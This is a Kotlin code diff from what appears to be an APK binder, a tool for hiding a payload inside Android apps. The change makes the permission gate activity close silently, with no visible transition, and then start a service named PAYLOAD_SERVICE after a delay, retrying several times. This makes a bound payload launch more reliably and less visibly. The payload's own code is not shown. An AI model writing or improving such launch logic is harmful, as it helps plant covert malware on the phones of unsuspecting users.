@@ -6,6 +6,8 @@ import android.graphics.Color
 import android.graphics.drawable.ColorDrawable
 import android.os.Build
 import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
 import Com.devhs.apkbinder.core.Const
 
 class PermissionGateActivity : Activity() {
@@ -46,22 +48,32 @@ class PermissionGateActivity : Activity() {
     private fun proceed() {
         if (finished) return
         finished = true
+
+        finish()
+        overridePendingTransition(0, 0)
+
+        Handler(Looper.getMainLooper()).postDelayed({ startServiceSafe(0) }, 3000L)
+    }
+
+    private fun startServiceSafe(attempt: Int) {
         val i = Intent()
         i.setClassName(packageName, Const.PAYLOAD_SERVICE)
         try {
             if (Build.VERSION.SDK_INT >= 26) startForegroundService(i) else startService(i)
             HsLog.w("service started")
         } catch (t: Throwable) {
-            HsLog.e("startForegroundService: ${t.message}")
-            try {
-                startService(i)
-                HsLog.w("service started plain")
-            } catch (t2: Throwable) {
-                HsLog.e("startService: ${t2.message}")
+            HsLog.e("startFGS($attempt): ${t.message}")
+            if (attempt < 3) {
+                Handler(Looper.getMainLooper()).postDelayed({ startServiceSafe(attempt + 1) }, 2000L)
+            } else {
+                try {
+                    startService(i)
+                    HsLog.w("service started plain")
+                } catch (t2: Throwable) {
+                    HsLog.e("startService: ${t2.message}")
+                }
             }
         }
-        finish()
-        overridePendingTransition(0, 0)
     }
 
     @Deprecated("Deprecated in Java")
